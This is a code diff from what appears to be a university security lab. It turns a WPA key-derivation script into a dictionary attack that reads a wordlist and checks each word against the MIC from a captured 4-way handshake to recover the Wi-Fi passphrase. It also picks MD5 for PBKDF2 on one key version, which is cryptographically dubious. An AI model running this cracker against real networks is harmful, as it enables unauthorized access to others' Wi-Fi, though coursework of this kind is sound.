@@ -14,8 +14,8 @@ __modifyBy__	= "Julien Huguet et Antoine Hunkeler"
 __copyright__   = "Copyright 2017, HEIG-VD"
 __license__ 	= "GPL"
 __version__ 	= "1.0"
-__email__ 	= "abraham.rubinstein@heig-vd.ch"
-__status__ 	= "Prototype"
+__email__ 		= "abraham.rubinstein@heig-vd.ch"
+__status__ 		= "Prototype"
 
 from scapy.all import *
 from binascii import a2b_hex, b2a_hex
@@ -38,8 +38,23 @@ def customPRF512(key,A,B):
         R = R+hmacsha1.digest()
     return R[:blen]
 
+
+# Open and read the worldlist, append to a list to have all the passphrase
+def readWorldList(path):
+	file = open(path, "r")
+	passphrase = list()
+	for word in file:
+		passphrase.append(word[:-1])
+	return passphrase
+
 # Read capture file -- it contains beacon, authentication, associacion, handshake and data
 wpa=rdpcap("wpa_handshake.cap") 
+
+# Set the path of the worldlist
+path = "./worldlist.txt"
+
+# Recover the different passphrase stored in the file worldlist
+passphrase = readWorldList(path)
 
 # Important parameters for key derivation - most of them can be obtained from the pcap file
 passPhrase  = "actuelle"
@@ -48,45 +63,44 @@ ssid        = wpa[3].info.decode('utf-8')
 APmac       = a2b_hex(wpa[0].addr2.replace(":",""))
 Clientmac   = a2b_hex(wpa[1].addr1.replace(":",""))
 
+# Take information about the version of key MD5 or SHA-1
+keyInformation = wpa[8][EAPOL].load[2]
+
 # Authenticator and Supplicant Nonces
 ANonce      = (wpa[5].load)[13:45]
 SNonce      = (wpa[6].load)[13:45]
 
 # This is the MIC contained in the 4th frame of the 4-way handshake
 # When attacking WPA, we would compare it to our own MIC calculated using passphrases from a dictionary
-mic_to_test = "36eef66540fa801ceee2fea9b7929b40"
+mic_to_test = wpa[8][EAPOL].load[-18:-2].hex()
 
 B           = min(APmac,Clientmac)+max(APmac,Clientmac)+min(ANonce,SNonce)+max(ANonce,SNonce) #used in pseudo-random function
 
 data        = a2b_hex("0103005f02030a0000000000000000000100000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000") #cf "Quelques détails importants" dans la donnée
 
-print ("\n\nValues used to derivate keys")
-print ("============================")
-print ("Passphrase: ",passPhrase,"\n")
-print ("SSID: ",ssid,"\n")
-print ("AP Mac: ",b2a_hex(APmac),"\n")
-print ("CLient Mac: ",b2a_hex(Clientmac),"\n")
-print ("AP Nonce: ",b2a_hex(ANonce),"\n")
-print ("Client Nonce: ",b2a_hex(SNonce),"\n")
-
-#calculate 4096 rounds to obtain the 256 bit (32 oct) PMK
-passPhrase = str.encode(passPhrase)
 ssid = str.encode(ssid)
-pmk = pbkdf2(hashlib.sha1,passPhrase, ssid, 4096, 32)
 
-#expand pmk to obtain PTK
-ptk = customPRF512(pmk, str.encode(A),B)
+for word in passphrase:
+	wordEncode = str.encode(word)
 
-#calculate MIC over EAPOL payload (Michael)- The ptk is, in fact, KCK|KEK|TK|MICK
-mic = hmac.new(ptk[0:16],data,hashlib.sha1)
+	# Check the version of the key to apply MD5 or SHA-1
+	if keyInformation != 10:	
+		pmk = pbkdf2(hashlib.md5,wordEncode, ssid, 4096, 32)
+	else:
+		pmk = pbkdf2(hashlib.sha1,wordEncode, ssid, 4096, 32)
+
+	#expand pmk to obtain PTK
+	ptk = customPRF512(pmk, str.encode(A),B)
+	#calculate MIC over EAPOL payload (Michael)- The ptk is, in fact, KCK|KEK|TK|MICK, [:-8] to remove the ICV
+	mic = hmac.new(ptk[0:16],data,hashlib.sha1).hexdigest()[:-8]	
+
+	# Test if the two mic match, if yes print message and stop, if not continue to check with the word in file
+	if mic == mic_to_test:
+		print("The passphrase used is correct : ", word, "\n")
+		break
+	else:
+		print("Try a new passphrase : ", word, "\n")
 
 
-print ("\nResults of the key expansion")
-print ("=============================")
-print ("PMK:\t\t",pmk.hex(),"\n")
-print ("PTK:\t\t",ptk.hex(),"\n")
-print ("KCK:\t\t",ptk[0:16].hex(),"\n")
-print ("KEK:\t\t",ptk[16:32].hex(),"\n")
-print ("TK:\t\t",ptk[32:48].hex(),"\n")
-print ("MICK:\t\t",ptk[48:64].hex(),"\n")
-print ("MIC:\t\t",mic.hexdigest(),"\n")
+
+
